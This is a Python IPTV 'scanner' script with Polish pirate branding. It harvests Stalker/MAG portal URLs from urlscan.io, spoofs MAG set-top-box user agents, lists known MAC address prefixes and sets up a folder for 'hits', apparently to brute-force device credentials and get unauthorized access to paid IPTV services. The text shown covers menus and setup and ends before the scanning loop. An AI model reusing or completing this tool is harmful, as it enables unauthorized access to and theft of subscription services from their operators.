# -*- coding: utf-8 -*-
# -*- update: [2025.05.08] -*-
# -*- Ғɪx: ༺ ᶫˣ ༻ -*-

wersja = "3.0"
nickn="❓"

import os, sys, importlib

def clear_screen(): os.system('cls' if os.name == 'nt' else 'clear')

def set_title_name(title: str) -> None:
    if sys.platform.startswith('win'): import ctypes; ctypes.windll.kernel32.SetConsoleTitleW(title)
    else: sys.stdout.flush(); sys.stdout.write(f'''\x1b]2;{title} \x07'''); sys.stdout.flush()

set_title_name(f"Piraci Premium Scaner | v{wersja} | Official")

packages = {
    "urllib3": "urllib3",
    "threading": "threading",
    "urllib": "urllib"
}

if os.name == 'nt' and sys.version_info > (3, 6, 7):
    packages["playsound"] = "playsound"
    packages["requests"] = "requests"
    packages["cloudscraper"] = "cloudscraper"
elif os.name != 'nt' and sys.version_info < (3, 6, 7):
    packages["sock"] = ["requests[socks]", "sock", "socks", "PySocks"]
    packages["cfscrape"] = "cfscrape"
    packages["requests"] = "requests==2.27.1"
    packages["cloudscraper"] = "cloudscraper==1.2.58"

for pkg, install_name in packages.items():
    try: globals()[pkg] = importlib.import_module(pkg)
    except ImportError: os.system(f'"{sys.executable}" -m pip install {install_name}'); globals()[pkg] = importlib.import_module(pkg)

import platform, datetime, requests, threading, urllib3, cloudscraper, cfscrape
import socket,hashlib,pathlib
import json, random, time, re
from datetime import date

try:
	import androidhelper as sl4a
	ad = sl4a.Android()
except (ConnectionRefusedError, ImportError):
    class DummyAndroid:
        def __getattr__(self, name):
            def method(*args, **kwargs):
                print(f"\n      \x1b[38;5;102mDummy call to: {name} with args {args} and kwargs {kwargs}")
                return None
            return method
    ad = DummyAndroid() 

clear_screen()

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

try:
	sesq= requests.Session()
	ses = cfscrape.create_scraper(sess=sesq)
except:ses= requests.Session()

import logging
logging.captureWarnings(True)

def restart_script(): print(f"\n\n         {GOLD}× {RED}ᴘʀᴏɢʀᴀᴍ ʀᴇsᴛᴀʀᴛᴜʝᴇ {GOLD}×      \n\n"); os.execv(sys.executable, [sys.executable] + sys.argv)

RED = "\x1b[38;5;9m"
FRED = "\x1b[1;38;5;9m"
BLUE = "\x1b[38;5;37m"
GREEN1 = "\x1b[38;5;10m"
GREEN = "\x1b[38;5;2m"
CYAN = "\x1b[38;5;14m"
MAGENTA = "\x1b[38;5;13m"
GRAY = "\x1b[38;5;102m"
GOLD = "\x1b[38;5;223m"
WHITE = "\x1b[38;5;1m"
YELLOW = "\x1b[38;5;11m"
FCYAN = "\x1b[1;38;5;14m"
FWHITE = "\x1b[1;38;5;1m"
FBLACK = "\x1b[1;38;5;0m"
FYELLOW = "\x1b[1;38;5;11m"
INVERT = "\x1b[1;7m"
RESET = "\x1b[0m"

AUTHOR = f'🜲ᶫˣ' if os.name == 'nt' else [f'🜲ᶫˣ', f'༺ ᶫˣ ༻   '][datetime.datetime.now().second % 2]

LOGO = f"""
  ⠀⠀⡶⠛⠲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡶⠚⢶⡀{AUTHOR}   
  ⢰⠛⠃⠀⢠⣏⠀⠀⠀⠀⣀⣠⣤⣤⣤⣤⣤⣤⣄⣀⡀⠀⠀⠀⣸⠇⠀⠈⠙⣧    
  ⠸⣦⣤⣄⠀⠙⢷⣤⣶⠟⣛⢍⣅⣤⣦⣮⣭⣉⣉⠙⠻⢷⣤⡾⠋⢀⣤⣤⣴⠏    
  ⠀⠀⠀⠈⠳⣤⡾⠋⣀⣴⣿⣿⠿⠿⠟⠛⠿⠿⣿⣿⣶⣄⠙⢿⣦⠟⠁      
  ⠀⠀⠀⢀⣾⠟⢀⣾⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣷⡄⠹⣷⡀⠀    
  ⠀⠀⠀⣾⡏⢠⣿⣿⡯⠤⠤⠤⠒⠒⠒⠒⠒⠒⠒⠤⠤⠽⣿⣿⡆⠹⣷⡀    
  ⠀⠀⢸⣟⣠⡿⠿⠟⠒⣒⣒⣉⣉⣉⣉⣉⣉⣉⣉⣉⣒⣒⡛⠻⠿⢤⣹⣇    
  ⠀⠀⣾⡭⢤⣤⣠⡞⠉⠁⢀⣀⣀⠀⠀⠀⠀⢀⣀⣀⠀⠈⢹⣦⣤⡤⠴⣿    
  ⠀⠀⣿⡇⢸⣿⣿⣇⠀⣼⣿⣿⣿⣷⠀⠀⣼⣿⣿⣿⣷⠀⢸⣿⣿⡇⠀⣿    
  ⠀⠀⢻⡇⠸⣿⣿⣿⡄⢿⣿⣿⣿⡿⠀⠀⢿⣿⣿⣿⡿⢀⣿⣿⣿⡇⢸⣿   
  ⠀⠀⠸⣿⡀⢿⣿⣿⣿⣆⠉⠛⠋⠀⢴⣶⠀⠉⠛⠉⣠⣿⣿⣿⡿⠀⣾⠇   
  ⠀⠀⠀⢻⣷⡈⢻⣿⣿⣿⣿⣶⣤⣀⣈⣁⣀⡤⣴⣿⣿⣿⣿⡿⠁⣼⠏⠀   
  ⠀⠀⠀⢀⣽⣷⣄⠙⢿⣿⣿⡟⢲⠧⡦⠼⠤⢷⢺⣿⣿⣿⠋⣠⣾⢿⣄ ⠀   
  ⣰⠟⠛⠛⠁⣨⡿⢷⣤⣈⠙⢿⡙⠒⠓⠒⠒⠚⡹⠛⢁⣬⣾⠿⣧⡀⠙⠋⠙⣆    
  ⠹⣤⡀⠀⠐⡏⠀⠀⠉⠛⠿⣶⣿⣶⣤⣤⣤⣾⣷⠾⠟⠋⠀⠀⢸⡇⠀⢠⣤⠟     
  ⠀⠀⠳⢤⠾⠃⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠘⠷⠤⠾⠁    
"""
if os.name == "nt":
    LOGO = f"""
  ╔═══╗──────────╔═══╗ {AUTHOR}   
  ║╔═╗║──────────║╔═╗║    
  ║╚═╝╠╦═╦══╦══╦╗║╚══╦══╦══╦═╗    
  ║╔══╬╣╔╣╔╗║╔═╬╣╚══╗║╔═╣╔╗║╔╗╗    
  ║║──║║║║╔╗║╚═╣║║╚═╝║╚═╣╔╗║║║║    
  ╚╝──╚╩╝╚╝╚╩══╩╝╚═══╩══╩╝╚╩╝╚╝    
"""
folder = "ᑭOᒪՏKI.ՏKᑌᖇᗯIᗴᒪ.Տᑕᗩᑎ"
dirs = ["combo", "portal", os.path.join("hits", folder)]
combo_dir, portal_dir, hits = map(lambda d: (os.makedirs(d, exist_ok=True) or d), [os.path.join(".\\" if os.name == 'nt' else "/sdcard/", d) for d in dirs])

yanpanel="hata" 
imzayan="" 
bul=0
hitc=0
cpm=0
macSayisi=999999999999991

feyzo=(f"""{RESET}{GOLD}
{LOGO}


            Pᴏʟsᴋɪ Sᴋᴀɴᴇʀ Iᴘᴛᴠ  

         🏴‍☠️ ℙ𝕀ℝ𝔸ℂ𝕀 ℤ 𝕂𝔸ℝ𝔸𝕀𝔹ó𝕎 🏴‍☠️             
{BLUE}             🏴‍☠️SɪʀQᴀᴢ Cᴏɴғɪɢ🏴‍☠️     {GOLD}

{FWHITE}         ᑭOᒪՏKI ՏKᑌᖇᗯIᗴᒪ Տᑕᗩᑎ           {RESET}{FWHITE}""")
kisacikti=""
ozelmac=""

def rwsa(text) -> str:
    normal_alphabet = "AĄÄBCĆDEĘFGHIJKLŁMNOÖÒÓPQRSŚTUÜVWXYZŻŹ" + "aąäbcćdeęfghijklłmnoöòópqrsśtuüvwxyzżź" + "1234567890" # + '+-=()'
    special_alphabet1 = "ᴀᴀᴀʙᴄᴄᴅᴇᴇғɢʜɪᴊᴋʟʟᴍᴎᴏᴏᴏᴏᴘǫʀssᴛᴜᴜᴠᴡxʏᴢzᴢ" + "ᴀᴀᴀʙᴄᴄᴅᴇᴇғɢʜɪᴊᴋʟʟᴍᴎᴏᴏᴏᴏᴘǫʀssᴛᴜᴜᴠᴡxʏᴢzz" + f"{'1234567890' if os.name == 'nt' else '𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿𝟶'}" # + '₊ ₋ ₌ ₍ ₎'
    special_alphabet2 = 'ᴬᴬᴬᴮᶜᶜᴰᴱᴱᶠᴳᴴᴵᴶᴷᴸᴸᴹᴺᴼᴼᴼᴼᴾᵠᴿˢˢᵀᵁᵁⱽᵂˣʸᶻᶻᶻ' + 'ᵃᵃᵃᵇᶜᶜᵈᵉᵉᶠᵍʰⁱʲᵏˡˡᵐⁿᵒᵒᵒᵒᵖᵠʳˢˢᵗᵘᵘᵛʷˣʸᶻᶻᶻ' + '¹²³⁴⁵⁶⁷⁸⁹⁰' # + '⁺⁻⁼⁽⁾'
    translation_table = str.maketrans(normal_alphabet, special_alphabet1)
    return text.translate(translation_table)

def set_country(country) -> str:
    country_mapping = { 'US': '🇺🇸 Stany Zjednoczone', 'NO': '🇳🇴 Norwegia', 'SE': '🇸🇪 Szwecja', 'HU': '🇭🇺 Węgry', 'FI': '🇫🇮 Finlandia', 'FR': '🇫🇷 Francja', 'DE': '🇩🇪 Niemcy', 'BG': '🇧🇬 Bułgaria', 'UA': '🇺🇦 Ukraina', 'BR': '🇧🇷 Brazylia', 'PL': '🇵🇱 Polska', 'AF': '🇦🇫 Afganistan', 'AL': '🇦🇱 Albania', 'DZ': '🇩🇿 Algieria', 'AO': '🇦🇴 Angola', 'AR': '🇦🇷 Argentyna', 'AM': '🇦🇲 Armenia', 'AU': '🇦🇺 Australia', 'AT': '🇦🇹 Austria', 'AZ': '🇦🇿 Azerbejdżan', 'BS': '🇧🇸 Bahamy', 'BH': '🇧🇭 Bahrajn', 'BD': '🇧🇩 Bangladesz', 'BB': '🇧🇧 Barbados', 'BY': '🇧🇾 Białoruś', 'BE': '🇧🇪 Belgia', 'BZ': '🇧🇿 Belize', 'BJ': '🇧🇯 Benin', 'BT': '🇧🇹 Bhutan', 'BO': '🇧🇴 Boliwia', 'BA': '🇧🇦 Bośnia i Hercegowina', 'BW': '🇧🇼 Botswana', 'CA': '🇨🇦 Kanada', 'CV': '🇨🇻 Wyspy Zielonego Przylądka', 'KH': '🇰🇭 Kambodża', 'CL': '🇨🇱 Chile', 'CM': '🇨🇲 Kamerun', 'CN': '🇨🇳 Chiny', 'CO': '🇨🇴 Kolumbia', 'CG': '🇨🇬 Kongo-Brazzaville', 'CD': '🇨🇩 Kongo-Kinszasa', 'CR': '🇨🇷 Kostaryka', 'HR': '🇭🇷 Chorwacja', 'CU': '🇨🇺 Kuba', 'CY': '🇨🇾 Cypr', 'CZ': '🇨🇿 Czechy', 'DK': '🇩🇰 Dania', 'DJ': '🇩🇯 Dżibuti', 'DO': '🇩🇴 Dominikana', 'EC': '🇪🇨 Ekwador', 'EG': '🇪🇬 Egipt', 'SV': '🇸🇻 Salwador', 'EE': '🇪🇪 Estonia', 'ET': '🇪🇹 Etiopia', 'GH': '🇬🇭 Ghana', 'GE': '🇬🇪 Gruzja', 'GR': '🇬🇷 Grecja', 'HK': '🇭🇰 Hongkong', 'IS': '🇮🇸 Islandia', 'IN': '🇮🇳 Indie', 'ID': '🇮🇩 Indonezja', 'IR': '🇮🇷 Iran', 'IE': '🇮🇪 Irlandia', 'IL': '🇮🇱 Izrael', 'IT': '🇮🇹 Włochy', 'JP': '🇯🇵 Japonia', 'JO': '🇯🇴 Jordania', 'KZ': '🇰🇿 Kazachstan', 'KE': '🇰🇪 Kenia', 'KR': '🇰🇷 Korea', 'LV': '🇱🇻 Łotwa', 'LB': '🇱🇧 Liban', 'LT': '🇱🇹 Litwa', 'LU': '🇱🇺 Luksemburg', 'MY': '🇲🇾 Malezja', 'MV': '🇲🇻 Malediwy', 'MT': '🇲🇹 Malta', 'MX': '🇲🇽 Meksyk', 'MD': '🇲🇩 Mołdawia', 'MC': '🇲🇨 Monako', 'MN': '🇲🇳 Mongolia', 'MA': '🇲🇦 Maroko', 'NP': '🇳🇵 Nepal', 'NL': '🇳🇱 Holandia', 'NZ': '🇳🇿 Nowa Zelandia', 'NI': '🇳🇮 Nikaragua', 'NG': '🇳🇬 Nigeria', 'MK': '🇲🇰 Macedonia Północna', 'PK': '🇵🇰 Pakistan', 'PA': '🇵🇦 Panama', 'PY': '🇵🇾 Paragwaj', 'PE': '🇵🇪 Peru', 'PH': '🇵🇭 Filipiny', 'PT': '🇵🇹 Portugalia', 'RO': '🇷🇴 Rumunia', 'RU': '🇷🇺 Rosja', 'SA': '🇸🇦 Arabia Saudyjska', 'SN': '🇸🇳 Senegal', 'RS': '🇷🇸 Serbia', 'SG': '🇸🇬 Singapur', 'SK': '🇸🇰 Słowacja', 'SI': '🇸🇮 Słowenia', 'ZA': '🇿🇦 Republika Południowej Afryki', 'ES': '🇪🇸 Hiszpania', 'LK': '🇱🇰 Sri Lanka', 'SD': '🇸🇩 Sudan', 'SR': '🇸🇷 Surinam', 'CH': '🇨🇭 Szwajcaria', 'SY': '🇸🇾 Syria', 'TW': '🇹🇼 Tajwan', 'TJ': '🇹🇯 Tadżykistan', 'TZ': '🇹🇿 Tanzania', 'TH': '🇹🇭 Tajlandia', 'TG': '🇹🇬 Togo', 'TT': '🇹🇹 Trynidad i Tobago', 'TN': '🇹🇳 Tunezja', 'TR': '🇹🇷 Turcja', 'TM': '🇹🇲 Turkmenistan', 'UG': '🇺🇬 Uganda', 'AE': '🇦🇪 Zjednoczone Emiraty Arabskie', 'GB': '🇬🇧 Wielka Brytania', 'UY': '🇺🇾 Urugwaj', 'UZ': '🇺🇿 Uzbekistan', 'VE': '🇻🇪 Wenezuela', 'VN': '🇻🇳 Wietnam', 'YE': '🇾🇪 Jemen', 'ZM': '🇿🇲 Zambia', 'ZW': '🇿🇼 Zimbabwe', 'Uɴᴋɴᴏᴡɴ': '🏴‍☠️ Pirat' }; result = f'{country_mapping.get(country, "🏴‍☠️ Pirat")} [{country}]'
    return rwsa(result)

def get_external_ip(): 
    try: return json.load(urllib.request.urlopen("http://httpbin.org/ip"))["origin"]
    except: return "Uɴᴋɴᴏᴡɴ"

def get_country_from_ip_online(ip_address, timeout: int = 3):
    try: return tuple(requests.get(f'http://ipinfo.io/{ip_address}/json', timeout=timeout, allow_redirects=False).json().get(k, 'Uɴᴋɴᴏᴡɴ') for k in ('region', 'city', 'country'))
    except: return ('Uɴᴋɴᴏᴡɴ', 'Uɴᴋɴᴏᴡɴ', 'Uɴᴋɴᴏᴡɴ')

ip_address = get_external_ip()
region, city, country = get_country_from_ip_online(ip_address)
country = set_country(country)
nick='@broccoloid'
bekleme=1
isimle=""
print(feyzo) 
nickn=input(f"""{BLUE}

{GREEN} ≼ ⟬ {GOLD}{country} {GREEN}⟭ ≽  {BLUE}

Enter your name
The name will be visible in a file with hits
 
{GREEN} ≼ ⟬ {GRAY} Example  = {GOLD}{nickn}{GREEN} ⟭ ≽  {BLUE}      

Name = {RESET}""") or nickn
intro=f"""
{GOLD}Default panel: portal.php

     {GOLD}1{GRAY} = {GREEN}portal.php
     {GOLD}2{GRAY} = {GREEN}server/load.php
     {GOLD}3{GRAY} = {GREEN}stalker_portal
     {GOLD}4{GRAY} = {GREEN}portalstb/portal.php
     {GOLD}5{GRAY} = {GREEN}k/portal.php(comet)
     {GOLD}6{GRAY} = {GREEN}maglove/portal.php
     {GOLD}7{GRAY} = {GREEN}XUI NXT /c/server/load.php
     {GOLD}8{GRAY} = {GREEN}XUI NXT /c/portal.php
     {GOLD}9{GRAY} = {GREEN}magportal/portal.php
     {GOLD}10{GRAY} = {GREEN}powerfull/portal.php
     {GOLD}11{GRAY} = {GREEN}magaccess/portal.php
     {GOLD}12{GRAY} = {GREEN}ministra/portal.php
     {GOLD}13{GRAY} = {GREEN}link ok/portal.php
     {GOLD}14{GRAY} = {GREEN}delko/portal.php
     {GOLD}15{GRAY} = {GREEN}delko/server/load.php
     {GOLD}16{GRAY} = {GREEN}bStream/server/load.php
     {GOLD}17{GRAY} = {GREEN}bStream/bs.mag.portal.php
     {GOLD}18{GRAY} = {GREEN}blowportal.php
     {GOLD}19{GRAY} = {GREEN}p/portal.php
     {GOLD}20{GRAY} = {GREEN}client/portal.php
     {GOLD}21{GRAY} = {GREEN}portalmega/portal.php
     {GOLD}22{GRAY} = {GREEN}portalmega/portalmega.php
     {GOLD}23{GRAY} = {GREEN}magload/magload.php
     {GOLD}24{GRAY} = {GREEN}portal/c/portal.php
     {GOLD}25{GRAY} = {GREEN}white/useragent/portal.php
     {GOLD}26{GRAY} = {GREEN}white/config/portal.php
     {GOLD}27{GRAY} = {GREEN}ultra/white/portal.php
     {GOLD}28{GRAY} = {GREEN}realblue/server/load.php
     {GOLD}29{GRAY} = {GREEN}realblue/portal.php
"""
intro=intro+f"""{BLUE}
Select a panel. 

{GREEN} ≼ ⟬ {GRAY}Recommended option number = {GOLD}8{GREEN} ⟭ ≽  {BLUE} 

Enter the panel number = {RESET}"""
panel = input(intro) or "8"
speed=""
uzmanm="portal.php"
useragent="okhttp/4.7.1"
if  panel=="" or panel=="1":
    	uzmanm="portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"     	
if panel=="2":
    	uzmanm="server/load.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
if panel=="3":
        uzmanm="stalker_portal/server/load.php"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"    	
if panel=="4":
        uzmanm="portalstb/portal.php"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
if panel=="5":
        uzmanm="k/portal.php"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
if panel=="6":
        uzmanm="maglove/portal.php"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
if panel=="7":
        uzmanm="c/server/load.php"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
if panel=="8":
        uzmanm="c/portal.php"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"    
if panel=="9":
        uzmanm="magportal/portal.php"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
if panel=="10":
       uzmanm="powerfull/portal.php"
       useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"     	    
if panel=="11":
       uzmanm="magaccess/portal.php"
       useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"  
if panel=="12":
       uzmanm="ministra/portal.php"
       useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"     	
if panel=="13":
      uzmanm="Link_OK"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
if panel=="14":
      uzmanm="delko/portal.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
if panel=="15":
      uzmanm="delko/server/load.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
if panel=="16":
      uzmanm="bStream/server/load.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
if panel=="17":
      uzmanm="bStream/bs.mag.portal.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
if panel=="18":
      uzmanm="blowportal/portal.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
if panel=="19":
      uzmanm="p/portal.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"  
if panel=="20":
      uzmanm="client/portal.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
if panel=="21":
      uzmanm="portalmega/portal.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
if panel=="22":
      uzmanm="portalmega/portalmega.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"  
if panel=="23":
      uzmanm="magload/magload.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
if panel=="24":
      uzmanm="portal/c/portal.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
if panel=="25":
      uzmanm="portal.php"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"    	
if panel=="26":
      uzmanm="portal.php"
      uzmanc="portal"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
if panel=="27":
      uzmanm="portal.php"
      uzmanc="ultra"
      useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3"
if panel=="28":
      uzmanm="server/load.php"
      uzmanc="realblue"  	  	
realblue=""
if panel=="29": realblue="real"
kanalkata="0"
totLen="000000"
dosyaa=""
yeninesil=(
'D4:CF:F9:',
'33:44:CF:',
'10:27:BE:',
'A0:BB:3E:',
'55:93:EA:',  
'04:D6:AA:',
'11:33:01:',
'00:1C:19:',
'1A:00:6A:',
'1A:00:FB:',
'00:1B:79:',
'78:a3:52:',
'CC:97:AB:',
'AC:AE:19:',
'E4:7D:BD:',
'FC:03:9F:',
'B8:BC:5B:',
'00:2A:79:',
'90:0E:B3:',
'00:1A:79:',
)

def fetch_and_save_urlscan_io():
    clear_screen()
    print(f"""{GRAY}

  █░█ █▀▄ █░ █▀ █▀ ▄▀█ █▄░█ ░ █ █▀█     
  █▄█ █▀▄ █▄ ▄█ █▄ █▀█ █░▀█ ▄ █ █▄█      
       portal scrapper by ༺ ᶫˣ ༻    
""")
    choice=input(f"\n\n{GOLD}         Click Enter to download  {RESET}") or ""
    if choice != "": return
    try:
        result_urls = []
        output_path = "new_200_portals.txt"
        folder_path = combo_dir
        output_file_path = folder_path+output_path
        base_url = "https://urlscan.io/api/v1/search/?q=filename%3A%22portal.php%3Ftype%3Dstb%26action%3Dhandshake%26token%3D%26prehash%3D0%26JsHttpRequest%3D1-xml%22"
        paginated_url = f"{base_url}"
        response = requests.get(paginated_url, timeout=3)
        response.raise_for_status()
        data = response.json()
        result_urls = [
            entry['page']['url']
            for entry in data.get('results', [])
            if 'page' in entry and entry['page'].get('status') == "200"
        ]
        with open(output_file_path, "w", encoding="utf-8") as file: file.write("\n".join([url.replace("https", "http") for url in result_urls]))
        with open(output_file_path, 'r', encoding='utf-8') as file: lines = file.readlines()
        result_urls = sorted(set(lines), key=lines.index)
        with open(output_file_path, 'w', encoding='utf-8') as file: file.writelines(result_urls)
        line_count = len(result_urls)
        sup_digits = '⁰¹²³⁴⁵⁶⁷⁸⁹'
        count_str = ''.join(sup_digits[int(d)] for d in str(line_count))
        new_output_file = os.path.join(folder_path, f"PORTAL_MAC-ᑭOᒪՏKI.ՏKᑌᖇᗯIᗴᒪ.Տᑕᗩᑎ✓ᵘʳᶫˢᶜᵃᶰ·ᶦᵒ·{count_str}_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt")
        os.rename(output_file_path, new_output_file)
        print(f'\n{GOLD}File downloaded with new {len(result_urls)} portals and saved: {new_output_file}')
        time.sleep(4)
    except requests.exceptions.RequestException as e:print(f"\n\n{RED}      ╭─◉🄴🅁🅁🄾🅁─○○     \n      ╰◉ ⍟ HTTP-Error: {e} ⍟    \n\n")
    except Exception as e:print(f"\n\n{RED}      ╭─◉🄴🅁🅁🄾🅁─○○     \n      ╰◉ ⍟ {e} ⍟    \n\n")
    clear_screen()

def fetch_and_choose_url():
    try:
        base_url = "https://urlscan.io/api/v1/search/?q=filename%3A%22portal.php%3Ftype%3Dstb%26action%3Dhandshake%26token%3D%26prehash%3D0%26JsHttpRequest%3D1-xml%22"
        response = requests.get(base_url, timeout=3)
        response.raise_for_status()
        data = response.json()
        result_urls = [
            entry['page']['url']
            for entry in data.get('results', [])
            if 'page' in entry and entry['page'].get('status') == "200"
        ]
        if not result_urls:
            print(f"\n\n{RED}      ╭─◉🄴🅁🅁🄾🅁─○○     \n      ╰◉ ⍟ No URL Found ⍟    \n\n")
            portal_input=2
            return None
        return result_urls
    except requests.exceptions.RequestException as e:print(f"\n\n{RED}      ╭─◉🄴🅁🅁🄾🅁─○○     \n      ╰◉ ⍟ HTTP-Error: {e} ⍟    \n\n"); portal_input=2
    except Exception as e:print(f"\n\n{RED}      ╭─◉🄴🅁🅁🄾🅁─○○     \n      ╰◉ ⍟ {e} ⍟    \n\n"); portal_input=2
    return None

print(f"""{BLUE} 

    1. Enter the portal
    2. Select a file with a portal
    3. Save portals from urlscan.io
    4. Download portals from urlscan.io


{GREEN} ≼ ⟬ {GRAY} Example = {GOLD}4{GREEN} ⟭ ≽  {BLUE} 
""")

portal_input = int(input("Choose: ") or 4)
print(f"""

{GREEN} ≼ ⟬ {GRAY} Your choice = {GOLD}{portal_input}{GREEN} ⟭ ≽  {BLUE}

""")

if portal_input == 3: fetch_and_save_urlscan_io(); portal_input = 2
if portal_input == 1:
    paneltotLen = print(f"""

{GREEN} ≼ ⟬ {GRAY} You can enter the multi portal, finish 
{GREEN} ≼ ⟬ {GRAY} empty line {GOLD}(2x Enter){GRAY}:
""")

    url_regex = re.compile(r'https?://[^\s/]+(?:/c/?|)')
    text_lines = []
    
    while True:
        line = input().strip()
        if not line: break
        text_lines.append(line)
    
    paneltotLen = [line.strip() for line in text_lines if url_regex.match(line)]
    
    if paneltotLen:
        paneluz = len(paneltotLen)
        erste_zeile = paneltotLen[0]
    else:
        paneltotLen = fetch_and_choose_url()
        paneluz=(len(paneltotLen))
        erste_zeile="LX-Scan"
    
if portal_input == 4:
    paneltotLen = fetch_and_choose_url()
    if paneltotLen:
        paneluz=len(paneltotLen)
